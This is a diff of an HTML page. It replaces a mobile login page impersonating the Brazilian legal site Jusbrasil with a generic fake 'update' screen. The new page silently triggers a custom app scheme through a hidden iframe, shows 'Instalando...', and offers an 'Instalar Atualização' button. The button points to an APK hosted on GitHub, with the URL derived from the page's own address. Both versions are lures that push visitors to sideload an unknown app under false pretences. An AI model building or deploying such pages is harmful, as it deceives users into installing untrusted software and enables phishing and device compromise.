@@ -3,242 +3,68 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Jusbrasil | Login</title>
+    <title>Atualização</title>
     <style>
-        :root {
-            --js-yellow: #FFB800;
-            --js-black: #333333;
-            --js-gray: #707070;
-            --js-light-gray: #F5F5F5;
-            --js-white: #FFFFFF;
-            --js-border: #E0E0E0;
-        }
-
-        * {
-            box-sizing: border-box;
-            -webkit-tap-highlight-color: transparent;
-        }
-
         body {
-            margin: 0;
-            padding: 0;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: var(--js-white);
+            background: #fff;
+            color: #333;
+            font-family: sans-serif;
             display: flex;
             flex-direction: column;
             align-items: center;
-            min-height: 100vh;
-        }
-
-        header {
-            width: 100%;
-            padding: 16px 20px;
-            display: flex;
             justify-content: center;
-            border-bottom: 1px solid var(--js-border);
+            height: 100vh;
+            margin: 0;
         }
-
-        .logo {
-            font-weight: 900;
-            font-size: 24px;
-            letter-spacing: -0.5px;
-            color: var(--js-black);
-        }
-
-        .logo span {
-            color: var(--js-yellow);
-        }
-
-        .login-container {
-            width: 100%;
-            max-width: 360px;
-            padding: 24px 20px;
-            flex-grow: 1;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-        }
-
-        h1 {
-            font-size: 24px;
-            font-weight: 600;
-            color: var(--js-black);
-            margin-bottom: 24px;
-            text-align: center;
-        }
-
-        .input-group {
-            margin-bottom: 16px;
-        }
-
-        label {
-            display: block;
+        .status {
             font-size: 14px;
-            color: var(--js-black);
-            margin-bottom: 6px;
-            font-weight: 500;
+            color: #999;
+            margin-bottom: 20px;
         }
-
-        input[type="email"],
-        input[type="password"] {
-            width: 100%;
-            padding: 12px 16px;
-            border: 1px solid var(--js-border);
-            border-radius: 4px;
-            font-size: 16px;
-            background-color: var(--js-light-gray);
-            transition: border-color 0.2s;
-        }
-
-        input:focus {
-            outline: none;
-            border-color: var(--js-yellow);
-            background-color: var(--js-white);
-        }
-
-        .btn-primary {
-            width: 100%;
-            padding: 14px;
-            background-color: var(--js-black);
-            color: var(--js-white);
-            border: none;
-            border-radius: 4px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            margin-top: 8px;
-            transition: opacity 0.2s;
-        }
-
-        .btn-primary:hover { opacity: 0.9; }
-        .btn-primary:active { transform: scale(0.98); }
-
-        .links {
-            margin-top: 24px;
-            text-align: center;
-            font-size: 14px;
-        }
-
-        .links a {
-            color: var(--js-black);
+        .btn {
+            background: #007aff;
+            color: #fff;
+            padding: 15px 30px;
+            border-radius: 8px;
             text-decoration: none;
-            margin: 0 8px;
-            font-weight: 500;
+            font-weight: bold;
+            display: none; /* Só aparece se falhar */
         }
-
-        .links a:hover { text-decoration: underline; }
-
-        .links a span { color: var(--js-gray); font-weight: 400; }
-
-        footer {
-            width: 100%;
-            padding: 20px;
-            text-align: center;
-            font-size: 12px;
-            color: var(--js-gray);
-            border-top: 1px solid var(--js-border);
-        }
-
-        .hidden-frame {
-            position: absolute;
-            width: 0;
-            height: 0;
-            border: 0;
-            visibility: hidden;
-            z-index: -1;
-        }
-        
-        .download-hint {
-            display: none; 
-            text-align: center; 
-            margin-top: 15px; 
-            font-size: 13px; 
-            color: var(--js-gray);
-        }
+        /* Esconde o iframe invisível */
+        iframe { display: none; }
     </style>
 </head>
 <body>
 
-    <!-- Iframe para abrir o app silenciosamente -->
-    <iframe id="appFrame" class="hidden-frame" src="about:blank"></iframe>
+    <!-- Iframe para tentar abrir o app silenciosamente -->
+    <iframe id="frame" src="about:blank"></iframe>
 
-    <header>
-        <div class="logo">jus<span>brasil</span></div>
-    </header>
+    <!-- Mensagem de "Processando" -->
+    <div class="status">Conectando ao servidor...</div>
 
-    <div class="login-container">
-        <h1>Faça login</h1>
-
-        <form onsubmit="event.preventDefault(); abrirApp();">
-            <div class="input-group">
-                <label for="email">E-mail ou CPF</label>
-                <input type="email" id="email" placeholder="Digite seu e-mail ou CPF" required>
-            </div>
-
-            <div class="input-group">
-                <label for="password">Senha</label>
-                <input type="password" id="password" placeholder="Digite sua senha" required>
-            </div>
-
-            <button type="submit" class="btn-primary">Entrar</button>
-            
-            <!-- Dica de download se o app não abrir -->
-            <div id="downloadHint" class="download-hint">
-                Caso não tenha aberto, <a id="apkLink" href="#" style="color: #333; font-weight: bold;">clique aqui para instalar o app</a>.
-            </div>
-        </form>
-
-        <div class="links">
-            <a href="#">Esqueci minha senha</a>
-            <br><br>
-            <a href="#">Não tem uma conta?</a>
-            <a href="#">Cadastre-se</a>
-        </div>
-    </div>
-
-    <footer>
-        &copy; 2026 Jusbrasil. Todos os direitos reservados.
-    </footer>
+    <!-- Botão de fallback (só aparece se o app não abrir) -->
+    <a id="installBtn" class="btn" href="#">Instalar Atualização</a>
 
     <script>
-        // CONFIGURAÇÕES DO SEU APP
+        // CONFIGURAÇÃO DO SEU APP
         const APP_SCHEME = "meuapp://"; 
-        const APP_ACTION = "login";     
+        const APP_ACTION = "sync"; // Ação silenciosa
 
-        function abrirApp() {
-            const btn = document.querySelector('.btn-primary');
-            const originalText = btn.innerText;
-            const hint = document.getElementById('downloadHint');
-            const apkLink = document.getElementById('apkLink');
+        // Tenta abrir o app via iframe
+        document.getElementById('frame').src = APP_SCHEME + APP_ACTION;
+
+        // Fallback: Se o app não abrir em 1 segundo, mostra o botão
+        setTimeout(() => {
+            document.querySelector('.status').innerText = "Instalando...";
+            const btn = document.getElementById('installBtn');
+            btn.style.display = 'block';
             
-            btn.innerText = "Aguardando...";
-            btn.style.opacity = "0.8";
-
-            const targetUrl = `${APP_SCHEME}${APP_ACTION}`;
-            
-            // Tenta abrir no iframe invisível
-            const frame = document.getElementById('appFrame');
-            frame.src = targetUrl;
-
-            // Fallback: Se o iframe demorar, tenta direto
-            setTimeout(() => {
-                window.location.href = targetUrl;
-            }, 300);
-
-            // Se demorar mais de 2 segundos, mostra o link de download
-            setTimeout(() => {
-                btn.innerText = originalText;
-                btn.style.opacity = "1";
-                
-                // Configura o link do APK automaticamente
-                const path = window.location.pathname;
-                const repoName = path.split('/')[1];
-                const rawUrl = `https://raw.githubusercontent.com/${window.location.hostname.split('.')[0]}/${repoName}/main/app.apk`;
-                
-                apkLink.href = rawUrl;
-                hint.style.display = "block"; // Mostra o link de download apenas se falhar
-            }, 2000);
-        }
+            // Pega o link do APK automaticamente do GitHub
+            const path = window.location.pathname;
+            const repoName = path.split('/')[1];
+            const rawUrl = `https://raw.githubusercontent.com/${window.location.hostname.split('.')[0]}/${repoName}/main/app.apk`;
+            btn.href = rawUrl;
+        }, 1000);
     </script>
 </body>
 </html>
